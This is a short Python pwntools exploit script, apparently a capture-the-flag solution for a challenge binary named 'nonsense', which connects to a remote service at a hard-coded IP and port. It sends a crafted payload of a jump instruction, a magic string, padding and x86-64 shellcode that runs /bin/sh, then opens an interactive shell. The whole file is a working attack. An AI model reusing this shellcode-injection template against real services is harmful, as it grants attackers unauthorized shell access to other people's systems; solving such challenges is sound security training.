from pwn import *

# p = process('./nonsense')
p = remote('60.250.197.227', 10001)
pause()

address = 0xDEADBEAF

p.recvuntil('your name?')
p.sendline(p64(address))

p.recvuntil('yours?')

shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

jacode = b'\x77\x20'

print(len(shellcode))

payload = jacode + b'wubbalubbadubdub' + b'A' * 0x10 + shellcode  

p.sendline(payload)

p.interactive()
